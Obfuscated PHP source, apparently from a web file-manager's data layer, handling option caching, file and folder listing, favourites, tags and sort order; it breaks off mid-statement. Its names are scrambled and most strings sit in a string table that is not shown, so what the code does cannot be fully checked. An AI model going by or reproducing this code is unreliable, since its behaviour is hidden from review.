goto EÎŠÔƒôÏõ; a–æ‹¼: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\x6d\117\160\x74\151\x6f\156"; public $field = array(); public function listData($«ÙœÄøÑ = false, $†íøÁ÷¾ = "\x6d\x6f\144\x69\x66\171\x54\151\x6d\x65", $ª¦¶ªÏ¦ = false) { $İ÷˜§ÙÍ = Model($this->modelType)->get(!1, $this->optionType, !0); $…ˆ´À¯ = array_values($İ÷˜§ÙÍ); if ($…ˆ´À¯ && $…ˆ´À¯[0] && !is_array($…ˆ´À¯[0])) { Model($this->modelType)->cacheRemove($this->optionType); $İ÷˜§ÙÍ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$İ÷˜§ÙÍ) { return $«ÙœÄøÑ ? null : array(); } if (!$«ÙœÄøÑ) { $İ÷˜§ÙÍ = array_filter(array_values($İ÷˜§ÙÍ)); return array_sort_by($İ÷˜§ÙÍ, $†íøÁ÷¾, $ª¦¶ªÏ¦); } return $İ÷˜§ÙÍ[$_SERVER[ç¦¬”œš][481] . $«ÙœÄøÑ]; } public function insert($°ÓàÂœ) { $À·¡Œ’ó =& $_SERVER[ç¦¬”œš]; $°ÓàÂœ = array_field_key($°ÓàÂœ, $this->field); $Ô¶Á‘Õ = Model($this->modelType)->get($À·¡Œ’ó[482], $this->optionType . $À·¡Œ’ó[483]); $Ô¶Á‘Õ = $Ô¶Á‘Õ ? $Ô¶Á‘Õ : 0; $°ÓàÂœ[$À·¡Œ’ó[484]] = ++$Ô¶Á‘Õ; $°ÓàÂœ[$À·¡Œ’ó[231]] = time(); $°ÓàÂœ[$À·¡Œ’ó[88]] = time(); Model($this->modelType)->set($À·¡Œ’ó[482], $Ô¶Á‘Õ, $this->optionType . $À·¡Œ’ó[483]); Model($this->modelType)->set($À·¡Œ’ó[481] . $Ô¶Á‘Õ, $°ÓàÂœ, $this->optionType); return $Ô¶Á‘Õ; } public function update($‹©ÒœÈ©, $ÂÅöÎÄ£) { $ı—íƒùÈ =& $_SERVER[ç¦¬”œš]; $ÂÅöÎÄ£ = array_field_key($ÂÅöÎÄ£, $this->field); $±¡Şéì‰ = $this->listData($‹©ÒœÈ©); if (!$±¡Şéì‰ || !$‹©ÒœÈ©) { return !1; } $ÂÅöÎÄ£ = array_merge($±¡Şéì‰, $ÂÅöÎÄ£); $ÂÅöÎÄ£[$ı—íƒùÈ[88]] = time(); return Model($this->modelType)->set($ı—íƒùÈ[481] . $‹©ÒœÈ©, $ÂÅöÎÄ£, $this->optionType); } public function remove($åö‚ã‚”) { if (!$åö‚ã‚”) { return !1; } return Model($this->modelType)->remove($_SERVER[ç¦¬”œš][481] . $åö‚ã‚”, $this->optionType); } public function clear() { $èµù½°¦ =& $_SERVER[ç¦¬”œš]; Model($this->modelType)->remove($èµù½°¦[482], $this->optionType . $èµù½°¦[483]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ö‹®êŒô, $›õ¼Ú¥) { if (!$›õ¼Ú¥) { return !1; } $ÊÌïîµ = $this->listData(); $ÊÌïîµ = array_to_keyvalue($ÊÌïîµ, $Ö‹®êŒô); return isset($ÊÌïîµ[$›õ¼Ú¥]) ? $ÊÌïîµ[$›õ¼Ú¥] : !1; } public function findByName($äÈƒåØ„) { return $this->findByKey($_SERVER[ç¦¬”œš][32], $äÈƒåØ„); } protected function resetData($¿ä¬Æ‚ß) { $ôÏï¯ß” =& $_SERVER[ç¦¬”œš]; $¿ä¬Æ‚ß = is_array($¿ä¬Æ‚ß) ? $¿ä¬Æ‚ß : array(); $§Â‘óÖã = array(); for ($¸—Òîá = 0; $¸—Òîá < count($¿ä¬Æ‚ß); $¸—Òîá++) { $§Â‘óÖã[$ôÏï¯ß”[481] . $¿ä¬Æ‚ß[$¸—Òîá][$ôÏï¯ß”[484]]] = $¿ä¬Æ‚ß[$¸—Òîá]; } return Model($this->modelType)->set($§Â‘óÖã, !1, $this->optionType); } private function getAutoName($ØòÆß´Â) { $Õ¹”¥£° = array_to_keyvalue($this->listData(), $_SERVER[ç¦¬”œš][32]); if (!$Õ¹”¥£° || !isset($Õ¹”¥£°[$ØòÆß´Â])) { return $ØòÆß´Â; } for ($€¦ıîÙœ = 1; $€¦ıîÙœ < count($Õ¹”¥£°); $€¦ıîÙœ++) { $Ãˆ¢¶Ãú = $ØòÆß´Â . "\50{$€¦ıîÙœ}\51"; if (!isset($Õ¹”¥£°[$Ãˆ¢¶Ãú])) { return $Ãˆ¢¶Ãú; } } return $Ãˆ¢¶Ãú; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($·é¯Œœ = false, $ú™·Ï¾Ñ = '', $»ã›Øª = false) { $Ô¢öˆª =& $_SERVER[ç¦¬”œš]; $Ã™¥ñ£µ = $this->cacheGet($ú™·Ï¾Ñ); $øÜºŒ¨û = $this->optionDefault($ú™·Ï¾Ñ); $øÜºŒ¨û = is_array($øÜºŒ¨û) ? $øÜºŒ¨û : array(); if (is_array($Ã™¥ñ£µ)) { $Ã™¥ñ£µ = array_merge($øÜºŒ¨û, $Ã™¥ñ£µ); return $·é¯Œœ ? isset($Ã™¥ñ£µ[$·é¯Œœ]) ? $Ã™¥ñ£µ[$·é¯Œœ] : null : $Ã™¥ñ£µ; } $…ù¬¿òÔ = $this->filterWhere(array($Ô¢öˆª[33] => $ú™·Ï¾Ñ)); $Ã™¥ñ£µ = $this->where($…ù¬¿òÔ)->select(); $Ã™¥ñ£µ = array_to_keyvalue($Ã™¥ñ£µ, $Ô¢öˆª[97], $Ô¢öˆª[450]); foreach ($Ã™¥ñ£µ as $´Ø¿—’º => $®çßïƒ) { if ($»ã›Øª || in_array($´Ø¿—’º, $this->jsonField)) { $Ã™¥ñ£µ[$´Ø¿—’º] = json_decode($®çßïƒ, !0); } } $this->cacheSet($ú™·Ï¾Ñ, $Ã™¥ñ£µ); $Ã™¥ñ£µ = array_merge($øÜºŒ¨û, $Ã™¥ñ£µ); return $·é¯Œœ ? $Ã™¥ñ£µ[$·é¯Œœ] : $Ã™¥ñ£µ; } public function set($íé«ûßİ, $Â‘Ñ¸šÛ = false, $©Û…èĞ® = '') { $â‚Ù‚åô =& $_SERVER[ç¦¬”œš]; $this->cacheRemove($©Û…èĞ®); $¢¿²îï¤ = array(); $Ù‰Æ¼¶Ğ = is_array($íé«ûßİ) ? $íé«ûßİ : array($íé«ûßİ => $Â‘Ñ¸šÛ); foreach ($Ù‰Æ¼¶Ğ as $œˆ“ÎÕ€ => $Ã¹İ›¿÷) { if (is_array($Ã¹İ›¿÷)) { $Ã¹İ›¿÷ = json_encode_force($Ã¹İ›¿÷); } $this->checkLength($Ã¹İ›¿÷, !1, $this->tableName . $â‚Ù‚åô[4] . $íé«ûßİ); $Ã¹İ›¿÷ = self::textEncode($Ã¹İ›¿÷); $Ù‰Æ¼¶Ğ = array($â‚Ù‚åô[33] => $©Û…èĞ®, $â‚Ù‚åô[97] => $œˆ“ÎÕ€, $â‚Ù‚åô[450] => $Ã¹İ›¿÷); $¢¿²îï¤[] = $this->filterWhere($Ù‰Æ¼¶Ğ); } if (!$¢¿²îï¤) { return !0; } $„ƒ©’ù» = $this->cacheKey($â‚Ù‚åô[485]); CacheLock::lock($„ƒ©’ù»); $àÖ·İ¤ = $this->addAll($¢¿²îï¤, array(), !0); CacheLock::unlock($„ƒ©’ù»); return $àÖ·İ¤; } protected function optionDefault($ôßˆ«¬ş = '') { return !1; } public function setDeep($×¥ÃËˆ, $»›Á¶¦À = false, $¦»Ì©š  = '') { $Ã„›ğüÖ = explode($_SERVER[ç¦¬”œš][10], $×¥ÃËˆ); $Ë‚Ø¥ï¿ = $this->get(); array_set_value($Ë‚Ø¥ï¿, $×¥ÃËˆ, $»›Á¶¦À); $this->set($Ã„›ğüÖ[0], $Ë‚Ø¥ï¿[$Ã„›ğüÖ[0]], $¦»Ì©š ); } public function remove($¢çŞ¦ô, $ñŠÛÌêŸ = '') { $ÍÊğÄä„ =& $_SERVER[ç¦¬”œš]; $this->cacheRemove($ñŠÛÌêŸ); $ö§• Œ = $this->filterWhere(array($ÍÊğÄä„[97] => $¢çŞ¦ô, $ÍÊğÄä„[33] => $ñŠÛÌêŸ)); if (is_null($¢çŞ¦ô)) { unset($ö§• Œ[$ÍÊğÄä„[97]]); } return $this->where($ö§• Œ)->delete(); } public function cacheSet($Âä¬Œ€, $¯€à£òı = false) { return Cache::set($this->cacheKey($Âä¬Œ€), $¯€à£òı); } public function cacheGet($¼¬Ôµ™) { return Cache::get($this->cacheKey($¼¬Ôµ™)); } public function cacheRemove($Ôó…Û¤) { return Cache::remove($this->cacheKey($Ôó…Û¤)); } protected function filterWhere($¥ÒÍÓ¬÷) { return $¥ÒÍÓ¬÷; } protected function cacheKey($âÅ‚õƒ) { return $âÅ‚õƒ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\145"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x69\157\137\x73\x6f\165\162\143\x65\137\155\x65\x74\141", "\155\x65\164\x61\106\151\x65\154\144" => "\163\x6f\165\162\143\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\151\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\x65\162\x74", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\x63\162\x65\x61\x74\x65\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\162\x74", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x76\x69\145\167\x54\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\164", "\x66\165\x6e\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‡Œ‹ÑåŞ) { return $this->listSource(array($_SERVER[ç¦¬”œš][486] => $‡Œ‹ÑåŞ)); } public function typeName($ö¸ü®…) { static $—ñİ¸ëÛ = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $—ñİ¸ëÛ[$ö¸ü®… . $_SERVER[ç¦¬”œš][12]]; } public function sourceListInfo($ÅÈœíáì, $Å„äêé = false) { $ùŒ±¬¶ =& $_SERVER[ç¦¬”œš]; $ÅÈœíáì = $ÅÈœíáì ? $ÅÈœíáì : array(); $ÅÈœíáì = array_filter(array_unique($ÅÈœíáì)); if (!$ÅÈœíáì) { return array(); } $€Œ·Ôãå = $this->where(array($ùŒ±¬¶[193] => array($ùŒ±¬¶[7], $ÅÈœíáì)))->select(); $this->_listDataApply($€Œ·Ôãå, $Å„äêé); return array_to_keyvalue($€Œ·Ôãå, $ùŒ±¬¶[193]); } public function pathInfoFilter(&$şòÂÃ½ˆ) { $ÍÆÓ—ß =& $_SERVER[ç¦¬”œš]; static $à„È˜‘ı = false; static $ùËŒ§Õš = false; static $è¡á÷ùª = false; if (!$à„È˜‘ı) { $ã²ù• = $ÍÆÓ—ß[487]; $ã²ù• .= $ÍÆÓ—ß[488]; $ã²ù• .= $ÍÆÓ—ß[489]; $Ï¿ş¡Òó = $ÍÆÓ—ß[490]; $ÈÄÊ¢ı = explode($ÍÆÓ—ß[50], $Ï¿ş¡Òó); $à„È˜‘ı = explode($ÍÆÓ—ß[50], $ã²ù•); $ùËŒ§Õš = array(); foreach ($à„È˜‘ı as $Œ’×æì) { if (in_array($Œ’×æì, $ÈÄÊ¢ı)) { continue; } $ùËŒ§Õš[] = $Œ’×æì; } $è¡á÷ùª = explode($ÍÆÓ—ß[50], $ÍÆÓ—ß[491]); } foreach ($è¡á÷ùª as $Ôôş®ˆ¥) { if (isset($şòÂÃ½ˆ[$Ôôş®ˆ¥])) { $şòÂÃ½ˆ[$Ôôş®ˆ¥] = intval($şòÂÃ½ˆ[$Ôôş®ˆ¥]); } } $şòÂÃ½ˆ[$ÍÆÓ—ß[87]] = $ÍÆÓ—ß[492] . $şòÂÃ½ˆ[$ÍÆÓ—ß[193]] . $ÍÆÓ—ß[493]; $şòÂÃ½ˆ[$ÍÆÓ—ß[33]] = $şòÂÃ½ˆ[$ÍÆÓ—ß[494]] == 1 ? $ÍÆÓ—ß[78] : $ÍÆÓ—ß[230]; $şòÂÃ½ˆ[$ÍÆÓ—ß[190]] = $this->typeName($şòÂÃ½ˆ[$ÍÆÓ—ß[190]]); if ($şòÂÃ½ˆ[$ÍÆÓ—ß[494]] != 1) { $şòÂÃ½ˆ[$ÍÆÓ—ß[169]] = $şòÂÃ½ˆ[$ÍÆÓ—ß[495]]; unset($şòÂÃ½ˆ[$ÍÆÓ—ß[495]]); } $ëÊÃÄ¿ = $à„È˜‘ı; if (isset($şòÂÃ½ˆ[$ÍÆÓ—ß[496]]) && $şòÂÃ½ˆ[$ÍÆÓ—ß[496]][$ÍÆÓ—ß[497]] == -1) { $ëÊÃÄ¿ = $ùËŒ§Õš; } $şòÂÃ½ˆ = array_field_key($şòÂÃ½ˆ, $ëÊÃÄ¿); return $şòÂÃ½ˆ; } public function listUserFav() { $¾üÎöÁı =& $_SERVER[ç¦¬”œš]; $ÃæÓäëø = Model($¾üÎöÁı[498])->listData(); $Èñöôïú = array_filter_by_field($ÃæÓäëø, $¾üÎöÁı[33], $¾üÎöÁı[499]); $Èñöôïú = array_to_keyvalue($Èñöôïú, $¾üÎöÁı[12], $¾üÎöÁı[87]); if ($Èñöôïú) { $ûºÜÍöŒ = $this->listSource(array($¾üÎöÁı[500] => array($¾üÎöÁı[501], $Èñöôïú))); } $ûºÜÍöŒ = array_to_keyvalue($ûºÜÍöŒ[$¾üÎöÁı[445]], $¾üÎöÁı[193]); foreach ($ÃæÓäëø as &$é…±‚æ) { $é…±‚æ = array($¾üÎöÁı[502] => $é…±‚æ[$¾üÎöÁı[484]], $¾üÎöÁı[503] => $é…±‚æ[$¾üÎöÁı[32]], $¾üÎöÁı[504] => $é…±‚æ[$¾üÎöÁı[87]], $¾üÎöÁı[505] => $é…±‚æ[$¾üÎöÁı[33]], $¾üÎöÁı[506] => $é…±‚æ[$¾üÎöÁı[231]], $¾üÎöÁı[507] => $é…±‚æ[$¾üÎöÁı[88]]); if ($é…±‚æ[$¾üÎöÁı[33]] == $¾üÎöÁı[499] && $ûºÜÍöŒ[$é…±‚æ[$¾üÎöÁı[87]]]) { $é…±‚æ[$¾üÎöÁı[90]] = $ûºÜÍöŒ[$é…±‚æ[$¾üÎöÁı[87]]]; } } unset($é…±‚æ); return $ÃæÓäëø; } public function listUserTag($¹†ÆÌç) { $Óª‹°Ò— =& $_SERVER[ç¦¬”œš]; if ($¹†ÆÌç && !is_array($¹†ÆÌç)) { $¹†ÆÌç = array($¹†ÆÌç); } $“¶¹¥Ô§ = Model($Óª‹°Ò—[508])->listData(); $û—€ıÁ = array(); $äúˆé = array(); foreach ($“¶¹¥Ô§ as $–ÜÛù÷†) { $¡«æš = $–ÜÛù÷†[$Óª‹°Ò—[87]]; if (!$¡«æš) { continue; } if (!isset($äúˆé[$¡«æš])) { $äúˆé[$¡«æš] = array(); } $äúˆé[$¡«æš][] = $–ÜÛù÷†[$Óª‹°Ò—[509]]; $û—€ıÁ[$–ÜÛù÷†[$Óª‹°Ò—[87]]] = $–ÜÛù÷†; } $Â¾å™­ = array(); $ÓÙÚÊØ = array(); $Šªá É’ = array(); foreach ($äúˆé as $»áÚ©ê½ => $áè“æèí) { $¾ÛÀ€é“ = !0; if (!$¹†ÆÌç) { $Â¾å™­[] = $»áÚ©ê½; continue; } foreach ($¹†ÆÌç as $§âæÏë™) { if (!in_array($§âæÏë™, $áè“æèí)) { $¾ÛÀ€é“ = !1; break; } } if (!$¾ÛÀ€é“) { continue; } if (!is_numeric($»áÚ©ê½)) { $ßå·®Ú¢ = $û—€ıÁ[$»áÚ©ê½]; $ØïË’ç = array($Óª‹°Ò—[32] => $ßå·®Ú¢[$Óª‹°Ò—[32]], $Óª‹°Ò—[87] => $ßå·®Ú¢[$Óª‹°Ò—[87]], $Óª‹°Ò—[33] => $ßå·®Ú¢[$Óª‹°Ò—[33]], $Óª‹°Ò—[90] => array($Óª‹°Ò—[510] => 1), $Óª‹°Ò—[232] => !0); if ($ßå·®Ú¢[$Óª‹°Ò—[33]] == $Óª‹°Ò—[230]) { $Šªá É’[] = $ØïË’ç; } if ($ßå·®Ú¢[$Óª‹°Ò—[33]] == $Óª‹°Ò—[78]) { $ÓÙÚÊØ[] = $ØïË’ç; } continue; } $Â¾å™­[] = $»áÚ©ê½; } if ($Â¾å™­) { $éÙ›´î = $this->listSource(array($Óª‹°Ò—[500] => array($Óª‹°Ò—[501], $Â¾å™­))); } $éÙ›´î = $éÙ›´î ? $éÙ›´î : array($Óª‹°Ò—[85] => array(), $Óª‹°Ò—[86] => array()); $éÙ›´î[$Óª‹°Ò—[85]] = array_merge($éÙ›´î[$Óª‹°Ò—[85]], $ÓÙÚÊØ); $éÙ›´î[$Óª‹°Ò—[86]] = array_merge($éÙ›´î[$Óª‹°Ò—[86]], $Šªá É’); if (isset($éÙ›´î[$Óª‹°Ò—[442]]) && count($Â¾å™­) == $éÙ›´î[$Óª‹°Ò—[442]][$Óª‹°Ò—[443]]) { return $éÙ›´î; } $À«±ÇÂ» = array(); $Ö°çêÎù = array_to_keyvalue($éÙ›´î[$Óª‹°Ò—[85]], $Óª‹°Ò—[12], $Óª‹°Ò—[193]); $Ò«¤ûšÈ = array_to_keyvalue($éÙ›´î[$Óª‹°Ò—[86]], $Óª‹°Ò—[12], $Óª‹°Ò—[193]); $£šûÃœì = array_merge($Ò«¤ûšÈ, $Ö°çêÎù); foreach ($Â¾å™­ as $¡«æš) { if (!in_array($¡«æš, $£šûÃœì)) { $À«±ÇÂ»[] = $¡«æš; } } if ($À«±ÇÂ») { Model($Óª‹°Ò—[511])->removeBySource($À«±ÇÂ»); } return $éÙ›´î; } public function listUserRecycle() { $˜ÆÒ½êø =& $_SERVER[ç¦¬”œš]; $¡Ã˜ôúÒ = Model($˜ÆÒ½êø[512])->listData(); if (!$¡Ã˜ôúÒ) { return array(); } $Öñ—©²È = array($˜ÆÒ½êø[500] => array($˜ÆÒ½êø[501], $¡Ã˜ôúÒ), $˜ÆÒ½êø[513] => 1); return $this->listSource($Öñ—©²È); } public function listSource($ˆ¤ëÖİ­, $çêıôÂ† = 3000, $¬íØÔŒÔ = false) { $Í¥Úé§Õ =& $_SERVER[ç¦¬”œš]; if (!isset($ˆ¤ëÖİ­[$Í¥Úé§Õ[514]])) { $ˆ¤ëÖİ­[$Í¥Úé§Õ[514]] = 0; } if (isset($ˆ¤ëÖİ­[$Í¥Úé§Õ[192]]) && $ˆ¤ëÖİ­[$Í¥Úé§Õ[192]] == $Í¥Úé§Õ[228]) { $ˆ¤ëÖİ­[$Í¥Úé§Õ[495]] = array($Í¥Úé§Õ[407], $Í¥Úé§Õ[515]); } $Œè·òÏä = $Í¥Úé§Õ[516]; $ß‡ˆµçÆ = $this->field($Œè·òÏä)->_makeOrder()->where($ˆ¤ëÖİ­)->selectPage($çêıôÂ†); $this->_listPageCheck($ß‡ˆµçÆ, $Œè·òÏä, $ˆ¤ëÖİ­); $this->_listDataApply($ß‡ˆµçÆ[$Í¥Úé§Õ[445]], $¬íØÔŒÔ); $this->_listMake($ß‡ˆµçÆ); return $ß‡ˆµçÆ; } private function _listPageCheck(&$®Ô÷¬˜€, $´Öôå‹…, $Ú ™¨) { $†Õª‰ =& $_SERVER[ç¦¬”œš]; if (!is_array($®Ô÷¬˜€[$†Õª‰[442]])) { return; } $í–¬¥“ = $®Ô÷¬˜€[$†Õª‰[442]]; if ($í–¬¥“[$†Õª‰[444]] <= 1) { return; } if ($í–¬¥“[$†Õª‰[443]] >= 100000) { return; } if (Model($†Õª‰[517])->get($†Õª‰[518]) != $†Õª‰[519]) { return; } $´Öôå‹… = str_replace(array($†Õª‰[53], $†Õª‰[418], $†Õª‰[262]), $†Õª‰[12], $´Öôå‹…); $´Öôå‹… = $†Õª‰[520] . str_replace($†Õª‰[50], $†Õª‰[521], $´Öôå‹…) . $†Õª‰[522]; $ƒ–×ŞŒÅ = $†Õª‰[523]; $ƒ–×ŞŒÅ = $ƒ–×ŞŒÅ . $†Õª‰[524]; $Ë¶Á¸—¿ = $í–¬¥“[$†Õª‰[439]] * ($í–¬¥“[$†Õª‰[429]] - 1) . $†Õª‰[50] . $í–¬¥“[$†Õª‰[439]]; $¼Û¤Ğ¾Ö = $this->_makeOrder(!0); $¨ÍüÉş = $†Õª‰[520] . str_replace($†Õª‰[50], $†Õª‰[521], $¼Û¤Ğ¾Ö[0]); if (strpos($¨ÍüÉş, $†Õª‰[525])) { $¨ÍüÉş = str_replace($†Õª‰[525], $†Õª‰[526], $¨ÍüÉş); } else { $¨ÍüÉş .= $†Õª‰[527] . $¼Û¤Ğ¾Ö[1]; } $¥ø½½ßº = array(); foreach ($Ú ™¨ as $ÇÆ¼´¥ => $ØğâŸ÷) { $¥ø½½ßº[$†Õª‰[520] . $ÇÆ¼´¥] = $ØğâŸ÷; } $this->alias($†Õª‰[528])->field($´Öôå‹…)->limit($Ë¶Á¸—¿)->order($¨ÍüÉş); $ã€ÚØÍ» = $this->join($ƒ–×ŞŒÅ)->where($¥ø½½ßº)->select(); if ($ã€ÚØÍ») { $®Ô÷¬˜€[$†Õª‰[445]] = $ã€ÚØÍ»; } } protected function _makeOrder($Şª¶Ñç‹ = false) { $¢¯æˆÜÉ =& $_SERVER[ç¦¬”œš]; $ĞÕîäˆÓ = Model($¢¯æˆÜÉ[529])->get($¢¯æˆÜÉ[530]); $Œ¶Ã¯¦ = Model($¢¯æˆÜÉ[529])->get($¢¯æˆÜÉ[531]); $ĞáÄ¬ò¿ = array($¢¯æˆÜÉ[532] => $¢¯æˆÜÉ[533], $¢¯æˆÜÉ[534] => $¢¯æˆÜÉ[535]); $¬ÓÛ­„Ÿ = array($¢¯æˆÜÉ[32] => $¢¯æˆÜÉ[32], $¢¯æˆÜÉ[79] => $¢¯æˆÜÉ[79], $¢¯æˆÜÉ[169] => $¢¯æˆÜÉ[495], $¢¯æˆÜÉ[536] => $¢¯æˆÜÉ[536], $¢¯æˆÜÉ[537] => $¢¯æˆÜÉ[538], $¢¯æˆÜÉ[231] => $¢¯æˆÜÉ[231], $¢¯æˆÜÉ[88] => $¢¯æˆÜÉ[88]); $¤ÔØ¾İê = Input::get($¢¯æˆÜÉ[539], $¢¯æˆÜÉ[7], $ĞÕîäˆÓ, array_keys($¬ÓÛ­„Ÿ)); $Êø¢ÔÓş = Input::get($¢¯æˆÜÉ[540], $¢¯æˆÜÉ[7], $Œ¶Ã¯¦, array_keys($ĞáÄ¬ò¿)); if (!in_array($¤ÔØ¾İê, array_keys($¬ÓÛ­„Ÿ))) { $¤ÔØ¾İê = $¢¯æˆÜÉ[32]; } if (!in_array($Êø¢ÔÓş, array_keys($ĞáÄ¬ò¿))) { $¤ÔØ¾İê = $¢¯æˆÜÉ[532]; } if ($¤ÔØ¾İê == $¢¯æˆÜÉ[32]) { } $êöËÂô® = $¢¯æˆÜÉ[541] . $¬ÓÛ­„Ÿ[$¤ÔØ¾İê] . $¢¯æˆÜÉ[53] . $ĞáÄ¬ò¿[$Êø¢ÔÓş]; $êöËÂô® = rtrim(trim($êöËÂô®), $¢¯æˆÜÉ[50]); if ($Şª¶Ñç‹) { return array($êöËÂô®, $ĞáÄ¬ò¿[$Êø¢ÔÓş]); } return $this->order($êöËÂô®); } protected function _listDataApplyItem($¦ç°™¼, $Ş²á¬¹ = false) { $ãéí›ÈŸ = array($¦ç°™¼); $this->_listDataApply($ãéí›ÈŸ, $Ş²á¬¹); return $ãéí›ÈŸ[0]; } protected function _listDataApply(&$ß×½¯®ò, $£Ãôß‡ü = false) { $·ùšğ¨Ü =& $_SERVER[ç¦¬”œš]; if (!$ß×½¯®ò) { $ß×½¯®ò = array(); return; } $ÑîÎ’†Î = array_to_keyvalue($ß×½¯®ò, $·ùšğ¨Ü[12], $·ùšğ¨Ü[193]); $ÑîÎ’†Î = array_unique($ÑîÎ’†Î); $this->_listSourceCache($ß×½¯®ò); if (!$£Ãôß‡ü) { $this->_listAppendMeta($ß×½¯®ò, $ÑîÎ’†Î); $this->_listAppendFileMeta($ß×½¯®ò, $ÑîÎ’†Î); $this->_listAppendChildren($ß×½¯®ò, $ÑîÎ’†Î); } $this->_listAppendPath($ß×½¯®ò); $this->_listAppendAuth($ß×½¯®ò); $this->_listAppendSourceInfo($ß×½¯®ò, $ÑîÎ’†Î); $this->_listAppendUser($ß×½¯®ò); $this->_listFilterInfo($ß×½¯®ò, $£Ãôß‡ü); $this->_listAppendAuthSecret($ß×½¯®ò); } protected function _listSourceCache($ÛÇ†­©‚) { $Š£‚·Ë¼ =& $_SERVER[ç¦¬”œš]; foreach ($ÛÇ†­©‚ as $·ãÍ–ÕÃ) { self::$cacheSourceInfo[$Š£‚·Ë¼[542] . $·ãÍ–ÕÃ[$Š£‚·Ë¼[193]]] = $·ãÍ–ÕÃ; } } protected function _listFilterInfo(&$İÚ¬Íœü, $ïÓùû»¬ = false) { $¹ÈÑ÷—¬ =& $_SERVER[ç¦¬”œš]; foreach ($İÚ¬Íœü as &$íªâ¿Ëü) { $íªâ¿Ëü = $this->pathInfoFilter($íªâ¿Ëü); self::$cachePathInfo[$¹ÈÑ÷—¬[543] . intval($ïÓùû»¬) . $¹ÈÑ÷—¬[462] . $íªâ¿Ëü[$¹ÈÑ÷—¬[193]]] = $íªâ¿Ëü; } unset($íªâ¿Ëü); } protected function _listMake(&$…“¯Óš) { $‘ø”ÇØ =& $_SERVER[ç¦¬”œš]; $…“¯Óš[$‘ø”ÇØ[85]] = array(); $…“¯Óš[$‘ø”ÇØ[86]] = array(); foreach ($…“¯Óš[$‘ø”ÇØ[445]] as $Ùğîñ“) { $—Æ½† = $Ùğîñ“[$‘ø”ÇØ[494]] == 1 ? $‘ø”ÇØ[85] : $‘ø”ÇØ[86]; $…“¯Óš[$—Æ½†][] = $Ùğîñ“; } unset($…“¯Óš[$‘ø”ÇØ[445]]); } protected function _listAppendMeta(&$à³‚áÄ¹, $õÉ½®…À) { $â“Ñ©ÚÏ =& $_SERVER[ç¦¬”œš]; $©°ú·Â³ = array($â“Ñ©ÚÏ[500] => array($â“Ñ©ÚÏ[501], $õÉ½®…À)); $éÖâñ¯ = Model($â“Ñ©ÚÏ[544])->field($â“Ñ©ÚÏ[545])->where($©°ú·Â³)->select(); if (!$éÖâñ¯) { return; } $ê€¡áˆİ = array($â“Ñ©ÚÏ[546], $â“Ñ©ÚÏ[547], $â“Ñ©ÚÏ[526]); $°·œ™İ = array(); foreach ($éÖâñ¯ as $ƒùì™À ) { if (!isset($°·œ™İ[$ƒùì™À [$â“Ñ©ÚÏ[193]]])) { $°·œ™İ[$ƒùì™À [$â“Ñ©ÚÏ[193]]] = array(); } if (in_array($ƒùì™À [$â“Ñ©ÚÏ[97]], $ê€¡áˆİ)) { continue; } $°·œ™İ[$ƒùì™À [$â“Ñ©ÚÏ[193]]][$ƒùì™À [$â“Ñ©ÚÏ[97]]] = $ƒùì™À [$â“Ñ©ÚÏ[450]]; } foreach ($à³‚áÄ¹ as &$§é“Í÷Ü) { $§é“Í÷Ü[$â“Ñ©ÚÏ[548]] = !1; if (isset($°·œ™İ[$§é“Í÷Ü[$â“Ñ©ÚÏ[193]]])) { $§é“Í÷Ü[$â“Ñ©ÚÏ[548]] = $°·œ™İ[$§é“Í÷Ü[$â“Ñ©ÚÏ[193]]]; } if ($this->fileIsLock($§é“Í÷Ü) && $§é“Í÷Ü[$â“Ñ©ÚÏ[496]]) { $Ú¹˜ÕÏæ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $§é“Í÷Ü[$â“Ñ©ÚÏ[496]][$â“Ñ©ÚÏ[497]] = AuthModel::authDisable($§é“Í÷Ü[$â“Ñ©ÚÏ[496]][$â“Ñ©ÚÏ[497]], $Ú¹˜ÕÏæ); $§é“Í÷Ü[$â“Ñ©ÚÏ[496]][$â“Ñ©ÚÏ[549]][$â“Ñ©ÚÏ[496]] = $§é“Í÷Ü[$â“Ñ©ÚÏ[496]][$â“Ñ©ÚÏ[497]]; } } unset($§é“Í÷Ü); } protected function _listAppendFileMeta(&$è·Ãµì, $ñ›ÌºÛõ) { $ä«ÃÖÉ =& $_SERVER[ç¦¬”œš]; $ôØ…üŞõ = array_to_keyvalue($è·Ãµì, $ä«ÃÖÉ[12], $ä«ÃÖÉ[550]); $ôØ…üŞõ = array_filter(array_unique($ôØ…üŞõ)); if (!$ôØ…üŞõ) { return; } $Ì¶½í¡á = array($ä«ÃÖÉ[551] => array($ä«ÃÖÉ[501], $ôØ…üŞõ)); $«‹÷çø  = $ä«ÃÖÉ[552]; $ÚÆüûÆ– = Model($ä«ÃÖÉ[553])->field($«‹÷çø )->where($Ì¶½í¡á)->select(); $ÚÆüûÆ– = array_to_keyvalue($ÚÆüûÆ–, $ä«ÃÖÉ[550]); $ºÌ³Ö¤ = Model($ä«ÃÖÉ[554])->field($ä«ÃÖÉ[555])->where($Ì¶½í¡á)->select(); $ºÌ³Ö¤ = $ºÌ³Ö¤ ? $ºÌ³Ö¤ : array(); $ Ğ©§Î¯ = array(); foreach ($ºÌ³Ö¤ as $²„ùÂ‰¤) { if (!isset($ Ğ©§Î¯[$²„ùÂ‰¤[$ä«ÃÖÉ[550]]])) { $ 